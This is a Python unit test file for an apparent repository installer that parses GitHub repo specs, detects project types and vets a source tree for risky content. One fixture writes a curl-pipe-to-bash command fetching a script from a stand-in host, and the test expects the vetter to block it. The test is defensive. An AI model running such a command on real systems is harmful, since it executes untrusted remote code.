"""Unit tests — no network, sirf local logic (parse/detect/vet)."""
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import install as mi  # noqa: E402


class TestParseSpec(unittest.TestCase):
    def test_owner_repo(self):
        self.assertEqual(mi.parse_spec("preetjanni/preet-pb8-auto-reply"),
                         ("preetjanni", "preet-pb8-auto-reply",
                          "https://github.com/preetjanni/preet-pb8-auto-reply.git"))

    def test_https_url(self):
        self.assertEqual(mi.parse_spec("https://github.com/vercel-labs/skills"),
                         ("vercel-labs", "skills",
                          "https://github.com/vercel-labs/skills.git"))

    def test_git_suffix(self):
        self.assertEqual(mi.parse_spec("https://github.com/a/b.git"),
                         ("a", "b", "https://github.com/a/b.git"))

    def test_ssh(self):
        self.assertEqual(mi.parse_spec("git@github.com:a/b.git"),
                         ("a", "b", "https://github.com/a/b.git"))

    def test_bad(self):
        with self.assertRaises(ValueError):
            mi.parse_spec("not-a-repo")
        with self.assertRaises(ValueError):
            mi.parse_spec("https://example.com/a/b")


class TestDetectType(unittest.TestCase):
    def _tree(self, files):
        d = Path(tempfile.mkdtemp())
        for f in files:
            p = d / f
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("x")
        return d

    def test_node(self):
        self.assertEqual(mi.detect_type(self._tree(["package.json"])), "node")

    def test_python_reqs(self):
        self.assertEqual(mi.detect_type(self._tree(["requirements.txt"])), "python")

    def test_python_scripts(self):
        self.assertEqual(mi.detect_type(self._tree(["main.py"])), "python-scripts")

    def test_rust(self):
        self.assertEqual(mi.detect_type(self._tree(["Cargo.toml"])), "rust")

    def test_go(self):
        self.assertEqual(mi.detect_type(self._tree(["go.mod"])), "go")

    def test_generic(self):
        self.assertEqual(mi.detect_type(self._tree(["README.md"])), "generic")


class TestVet(unittest.TestCase):
    def test_block_curl_bash(self):
        tree = Path(tempfile.mkdtemp())
        (tree / "install.sh").write_text("curl -s https://x.example/a.sh | bash\n")
        findings, _ = mi.vet_tree(tree)
        self.assertTrue(any(f[0] == "BLOCK" for f in findings))

    def test_warn_subprocess(self):
        tree = Path(tempfile.mkdtemp())
        (tree / "a.py").write_text("import subprocess\nsubprocess.run(['ls'])\n")
        findings, _ = mi.vet_tree(tree)
        self.assertTrue(any(f[0] == "WARN" for f in findings))

    def test_clean_repo(self):
        tree = Path(tempfile.mkdtemp())
        (tree / "README.md").write_text("# hi\n")
        (tree / "LICENSE").write_text("MIT\n")
        (tree / "main.py").write_text("print('hi')\n")
        findings, info = mi.vet_tree(tree)
        self.assertEqual([f for f in findings if f[0] == "BLOCK"], [])
        self.assertTrue(info["readme"] and info["license"])

    def test_npm_hook_warn(self):
        tree = Path(tempfile.mkdtemp())
        (tree / "package.json").write_text(
            '{"name": "x", "scripts": {"postinstall": "node setup.js"}}')
        findings, _ = mi.vet_tree(tree)
        self.assertTrue(any("postinstall" in f[2] for f in findings))


if __name__ == "__main__":
    unittest.main()
